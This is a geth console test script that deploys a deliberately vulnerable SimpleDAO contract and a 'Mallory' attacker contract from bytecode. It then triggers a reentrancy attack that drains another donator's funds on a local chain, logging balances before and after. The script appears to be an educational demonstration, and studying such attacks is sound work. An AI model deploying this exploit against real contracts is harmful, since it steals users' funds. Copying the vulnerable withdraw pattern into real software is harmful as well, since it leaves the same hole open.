var me = eth.accounts[0];
console.log("Test ::: Me: " + me + " and my balance: " + eth.getBalance(me));

miner.start(1);

console.log("Test ::: Creating SimpleDAO contract:");
var simpledaoContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"queryCredit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"credit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]);
var simpledaoAddr;
var simpledao = simpledaoContract.new(
   {
     from: me, 
     data: '0x6060604052341561000f57600080fd5b6102ef8061001e6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062362a951461005d5780632e1a7d4d1461008b57806359f1286d146100ae578063d5d44d80146100fb57600080fd5b610089600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610148565b005b341561009657600080fd5b6100ac6004808035906020019091905050610197565b005b34156100b957600080fd5b6100e5600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610263565b6040518082815260200191505060405180910390f35b341561010657600080fd5b610132600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506102ab565b6040518082815260200191505060405180910390f35b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151561025f573373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185876187965a03f1925050509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600060205280600052604060002060009150905054815600a165627a7a72305820ebe2d7f0315f16e9080ca5a1b56fe1664fe92e118cd79b5493a59978fee5e0120029', 
     gas: '4700000'
   }, function (e, contract){
    if (typeof contract.address !== 'undefined') {
	simpledaoAddr = contract.address;

	console.log("Test ::: Created SimpleDAO contract: " + simpledaoAddr);

	console.log("Test ::: Creating Mallory contract:");
	var malloryContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"dao","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"getJackpot","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"addr","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);

	var malloryAddr;
	var mallory = malloryContract.new(
	   simpledaoAddr,
	   {
	     from: me, 
	     data: '0x6060604052341561000f57600080fd5b6040516020806103b98339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102fd806100bc6000396000f3006060604052361561004a576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634162169f146101cd5780639329066c14610222575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166359f1286d306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561014b57600080fd5b6102c65a03f1151561015c57600080fd5b505050604051805190506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15156101b757600080fd5b6102c65a03f115156101c857600080fd5b505050005b34156101d857600080fd5b6101e0610237565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561022d57600080fd5b61023561025c565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050509050505600a165627a7a72305820205c70242492a3c0c71484321c3aff056a2506cd4478afc382ca14e37534f1260029', 
	     gas: '4700000'
	   }, function (e, contract){
	    if (typeof contract.address !== 'undefined') {
		malloryAddr=mallory.address;

		mallory = malloryContract.at(malloryAddr);
		console.log("Test ::: Created Mallory contract: " + malloryAddr);

		var donator=eth.accounts[1];
		console.log("Test ::: Mallory is me: " + me);
		console.log("Test ::: Real Mallory contract: " + malloryAddr);
		console.log("Test ::: SimpleDAO contract: " + simpledaoAddr);
		console.log("Test ::: The victim of the bug - a donator: " + donator);


		console.log("Test ::: Donate 1000 wei to Mallory - Call SimpleDAO.donate() ...");
		simpledao.donate(malloryAddr, {from: me, value: 1000}); // Donate 1000 wei to mallory
		admin.sleepBlocks(3);

		console.log("Test ::: Donate 3000 wei to account 0 - Call SimpleDAO.donate() ...");
		simpledao.donate(donator, {from: me, value: 3000}); // Donate 3000 wei to account 0
		admin.sleepBlocks(3);

		console.log("Test ::: Before: SimpleDAO has " + eth.getBalance(simpledaoAddr) + " and Mallory has " + eth.getBalance(malloryAddr));

		console.log("Test ::: Send 1 wei to Mallory contract - sendTransaction() ...");
		eth.sendTransaction({from: me, to: malloryAddr, value: 1, gas: 500000}); // Send 1 wei to mallory in order to invoke fallback function, will cause mallory to gain 1 wei + 3k wei stolen, totaling to 4k+1 wei.
		admin.sleepBlocks(3);
		console.log("Test ::: After: SimpleDAO has " + eth.getBalance(simpledaoAddr) + " and Mallory has " + eth.getBalance(malloryAddr));

	    }
	 });

	
    }
 });













